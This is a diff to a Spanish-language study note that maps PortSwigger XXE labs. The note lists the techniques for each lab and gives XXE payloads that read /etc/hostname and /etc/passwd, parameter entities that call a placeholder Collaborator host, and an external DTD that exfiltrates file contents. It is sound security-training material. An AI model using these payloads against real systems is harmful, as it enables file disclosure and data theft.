@@ -29,7 +29,7 @@ Labs de la categoría **[XML external entity (XXE) injection](https://portswigge
 | # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
 | --- | --- | --- | --- | --- |
 | 3 | [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack) | `productId` que el server **mete en un XML del lado servidor** (vos **no** controlás el documento entero → no podés poner `<!DOCTYPE>`) | **XInclude:** como no controlás el doc, inyectás un `<xi:include>` en el valor que sí controlás. No hace falta DOCTYPE. | Leer **`/etc/passwd`** vía `xi:include parse="text"`. |
-| 4 | [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | **Subida de imagen** (avatar del comentario) que procesa **SVG** (¡es XML!) | **XXE en SVG:** subís un `.svg` con `<!DOCTYPE>`+entidad; el server lo renderiza y devuelve el texto. → PoC ya en el repo: [[vulnerabilities/006-xxe/bitso.0whvrzxl.oti8.svg\|bitso…svg]] | Leer **`/etc/hostname`** (aparece en la imagen/comentario renderizado). |
+| 4 | [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | **Subida de imagen** (avatar del comentario) que procesa **SVG** (¡es XML!) | **XXE en SVG:** subís un `.svg` con `<!DOCTYPE>`+entidad; el server lo renderiza y devuelve el texto. → [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg\|ejemplo 004]] · generalo con [[vulnerabilities/006-xxe/scripts/README\|gen_svg_xxe.py]] | Leer **`/etc/hostname`** (aparece en la imagen/comentario renderizado). |
 | 5 | [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction) | **"Check stock"** pero la respuesta **no refleja** nada (blind) | **OOB con Collaborator:** entidad `SYSTEM "http://COLLAB"`. Si el parser **bloquea entidades generales externas**, pasás a **entidad de parámetro** `%`. Necesitás **Burp Collaborator**. | Provocar una **interacción DNS/HTTP** hacia tu Collaborator (probar que hay XXE ciego). |
 | 6 | [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities) | **"Check stock"** con entidades **generales filtradas** | **Entidades de parámetro (`%`):** cuando el WAF/parser filtra entidades normales, usás `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;`. Necesitás **Collaborator**. | Interacción **OOB** hacia el Collaborator. |
 | 7 | [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) | **"Check stock"** blind | **DTD externa maliciosa:** subís un `.dtd` al **exploit server** que encadena entidades de parámetro y **exfiltra el contenido del archivo en la URL** de salida. Necesitás **exploit server** (+ Collaborator opcional). | Exfiltrar **`/etc/hostname`** vía la query string de tu server. |
@@ -69,7 +69,7 @@ Labs de la categoría **[XML external entity (XXE) injection](https://portswigge
 ```
 > Va **en el valor** del parámetro `productId` (no como body completo, porque el server arma el XML).
 
-**L4 — XXE vía SVG (upload de imagen):** ya está en el repo → [[vulnerabilities/006-xxe/bitso.0whvrzxl.oti8.svg|bitso…svg]]
+**L4 — XXE vía SVG (upload de imagen):** generalo con [[vulnerabilities/006-xxe/scripts/README|gen_svg_xxe.py]] (`-r file:///etc/hostname`) · ejemplo → [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg|004]]
 ```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
@@ -142,4 +142,5 @@ Labs de la categoría **[XML external entity (XXE) injection](https://portswigge
 > - **Entry point** (detección, árbol de decisión, plantillas) → [[vulnerabilities/006-xxe/xxe|xxe]]
 > - **Fundamentos** (qué es XML/DTD/entidades) → [[how-to-work/xml|how-to-work/xml]]
 > - **Escalera del XXE ciego** (exfil/error/DTD externa/local + diagrama) → [[vulnerabilities/006-xxe/xxe#🪜 Escalera del XXE ciego (blind)|entry point]]
-> - **Ejemplos / PoCs completas** (una por vector, con request + `Content-Type` + DTD) → carpeta [[vulnerabilities/006-xxe/examples/xxe-ciego-exfiltrar-con-dtd-externo|examples/]]
+> - **Ejemplos / PoCs completas** `001`→`008` (del más simple al más rebuscado, cada uno con su "por qué") → empezá por [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]]
+> - **Scripts** (generadores en Python) → [[vulnerabilities/006-xxe/scripts/README|scripts/]]
